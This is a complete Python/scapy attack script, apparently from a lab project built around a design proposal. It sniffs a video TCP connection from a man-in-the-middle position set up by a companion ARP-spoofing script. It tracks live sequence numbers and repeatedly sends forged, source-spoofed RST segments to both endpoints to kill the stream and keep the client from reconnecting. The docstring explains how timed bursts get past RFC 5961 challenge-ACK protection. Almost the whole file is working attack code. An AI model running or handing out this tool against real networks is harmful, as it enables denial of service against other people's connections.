#!/usr/bin/env python3
"""
rst_attack.py — Sniff the relayed video flow and inject forged TCP RST segments
(design proposal Sections 2.4, 3, and Implementation Phases C & D).

Prerequisite: you must already be MITM (run arp_spoof.py first) so the
server<->client segments transit this host and their live sequence numbers are
readable.

Why a naive "one RST off a data segment" fails against a modern (RFC 5961)
kernel: a RST is accepted immediately only if seq == RCV.NXT *exactly*. On a
live stream RCV.NXT keeps advancing, and a RST computed from a server data
segment races that very segment's delivery, so it is usually stale-by-one and
gets only a challenge ACK. See spec Section 3 ("timing caveat under high
throughput").

This implementation is robust to that drift:

  * A sniffer thread continuously learns the connection's live state:
      - the CLIENT's RCV.NXT   = the ack field of the client's own ACKs
                                 (authoritative: the client itself says what it
                                  wants next), and the server-data frontier.
      - the SERVER's RCV.NXT   = the client's send seq / the server's ack field.
  * A sender thread hammers forged RSTs at both endpoints every --interval
    seconds, bursting +/- MSS around each candidate (spec Section 3). Because
    the streamer paces the video, there are frequent quiet gaps during which
    RCV.NXT is momentarily stable and an exact-match RST lands. Sustained
    hammering also keeps the client down if it auto-reconnects.

Usage:
  python3 rst_attack.py --client 172.20.0.20 --server 172.20.0.10 --port 9000 \
                        [-i eth0] [--no-server] [--burst 3] [--interval 0.03] \
                        [--duration 0]   # 0 = run until Ctrl+C
"""
import argparse
import sys
import threading
import time

from scapy.all import IP, TCP, AsyncSniffer, conf, send


class State:
    def __init__(self):
        self.lock = threading.Lock()
        self.ready = False
        self.cli_port = None            # client's ephemeral port
        self.cli_rcv_nxt = None         # from the client's ACK.ack (authoritative)
        self.srv_frontier = None        # from server data: seq + payload len
        self.srv_rcv_nxt = None         # what the server expects from the client
        self.observed_reset = False     # saw a RST on the wire
        self.stop = False


def clamp32(x):
    return x & 0xFFFFFFFF


class Attack:
    def __init__(self, args):
        self.a = args
        self.s = State()
        self.sent = 0

    # ---- sniffer: learn live sequence numbers ---------------------------------
    def on_pkt(self, pkt):
        if IP not in pkt or TCP not in pkt:
            return
        ip, tcp = pkt[IP], pkt[TCP]
        is_s2c = (ip.src == self.a.server and ip.dst == self.a.client
                  and tcp.sport == self.a.port)
        is_c2s = (ip.src == self.a.client and ip.dst == self.a.server
                  and tcp.dport == self.a.port)
        if not (is_s2c or is_c2s):
            return
        flags = int(tcp.flags)
        # Never learn sequence state from RST/SYN packets. Crucially this skips
        # OUR OWN injected RSTs (which the sniffer also sees on the wire and which
        # carry ack=0) — otherwise they would poison cli_rcv_nxt to 0.
        if flags & 0x04:  # RST
            with self.s.lock:
                self.s.observed_reset = True
            return
        if flags & 0x02:  # SYN (handshake) — seq/ack not yet steady state
            return
        paylen = len(tcp.payload)
        with self.s.lock:
            if is_c2s:
                self.s.cli_port = tcp.sport
                # The client's ACK.ack IS the client's RCV.NXT — authoritative,
                # already reflects everything the client has processed.
                self.s.cli_rcv_nxt = int(tcp.ack)
                self.s.srv_rcv_nxt = clamp32(int(tcp.seq) + paylen)
            else:  # is_s2c
                self.s.cli_port = tcp.dport
                self.s.srv_frontier = clamp32(int(tcp.seq) + paylen)
                self.s.srv_rcv_nxt = int(tcp.ack)
            if self.s.cli_port is not None and (
                    self.s.cli_rcv_nxt is not None or self.s.srv_frontier is not None):
                if not self.s.ready:
                    self.s.ready = True
                    print(f"[rst] locked onto connection: client "
                          f"{self.a.client}:{self.s.cli_port} <-> "
                          f"{self.a.server}:{self.a.port}", flush=True)

    # ---- sender: hammer forged RSTs ------------------------------------------
    def _burst_seqs(self, base):
        n = max(self.a.burst, 1)
        half = (n - 1) // 2
        return [clamp32(base + k * self.a.mss) for k in range(-half, n - half)]

    def send_round(self):
        with self.s.lock:
            if not self.s.ready:
                return
            cli_port = self.s.cli_port
            cli_candidates = set()
            if self.s.cli_rcv_nxt is not None:
                cli_candidates.add(self.s.cli_rcv_nxt)
            if self.s.srv_frontier is not None:
                cli_candidates.add(self.s.srv_frontier)
            srv_rcv_nxt = self.s.srv_rcv_nxt

        pkts = []
        # RST the CLIENT (src = server), covering each candidate +/- MSS.
        for base in cli_candidates:
            for seq in self._burst_seqs(base):
                pkts.append(IP(src=self.a.server, dst=self.a.client) /
                            TCP(sport=self.a.port, dport=cli_port,
                                flags="R", seq=seq, window=0))
        # Optionally RST the SERVER (src = client).
        if not self.a.no_server and srv_rcv_nxt is not None:
            for seq in self._burst_seqs(srv_rcv_nxt):
                pkts.append(IP(src=self.a.client, dst=self.a.server) /
                            TCP(sport=cli_port, dport=self.a.port,
                                flags="R", seq=seq, window=0))
        if pkts:
            send(pkts, verbose=0)  # L3 send; conf.iface set in main()
            self.sent += len(pkts)

    def run(self):
        bpf = (f"tcp and host {self.a.server} and host {self.a.client} "
               f"and port {self.a.port}")
        print(f"[rst] sniffing on {self.a.iface}: {bpf}")
        print(f"[rst] mode=SUSTAINED reset_server={not self.a.no_server} "
              f"burst={self.a.burst} interval={self.a.interval}s "
              f"duration={'forever' if self.a.duration == 0 else str(self.a.duration)+'s'}")
        print("[rst] waiting to lock onto the victim connection ... (Ctrl+C to stop)")

        sniffer = AsyncSniffer(iface=self.a.iface, filter=bpf,
                               prn=self.on_pkt, store=0)
        sniffer.start()

        start = time.time()
        last_report = 0.0
        try:
            while not self.s.stop:
                self.send_round()
                now = time.time()
                if self.s.ready and now - last_report >= 1.0:
                    with self.s.lock:
                        print(f"[rst] hammering: cli_rcv_nxt={self.s.cli_rcv_nxt} "
                              f"srv_frontier={self.s.srv_frontier} "
                              f"srv_rcv_nxt={self.s.srv_rcv_nxt} "
                              f"| RSTs sent={self.sent}", flush=True)
                    last_report = now
                if self.a.duration and (now - start) >= self.a.duration:
                    print(f"[rst] duration reached ({self.a.duration}s), stopping.", flush=True)
                    break
                time.sleep(self.a.interval)
        except KeyboardInterrupt:
            print("\n[rst] interrupted.", flush=True)
        finally:
            sniffer.stop()
        print(f"[rst] done. {self.sent} RST packets injected.", flush=True)
        return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Forged TCP RST injection (robust)")
    ap.add_argument("--client", required=True, help="victim client IP")
    ap.add_argument("--server", required=True, help="video server IP")
    ap.add_argument("--port", type=int, required=True, help="server TCP port")
    ap.add_argument("-i", "--iface", default="eth0", help="interface (default eth0)")
    ap.add_argument("--no-server", action="store_true",
                    help="only reset the client (default: reset both endpoints)")
    ap.add_argument("--burst", type=int, default=3,
                    help="RSTs per candidate, stepped by MSS (default 3)")
    ap.add_argument("--mss", type=int, default=1460, help="MSS step for burst (default 1460)")
    ap.add_argument("--interval", type=float, default=0.03,
                    help="seconds between hammer rounds (default 0.03)")
    ap.add_argument("--duration", type=float, default=0,
                    help="seconds to run; 0 = until Ctrl+C (default 0)")
    args = ap.parse_args()
    conf.iface = args.iface
    return Attack(args).run()


if __name__ == "__main__":
    sys.exit(main())
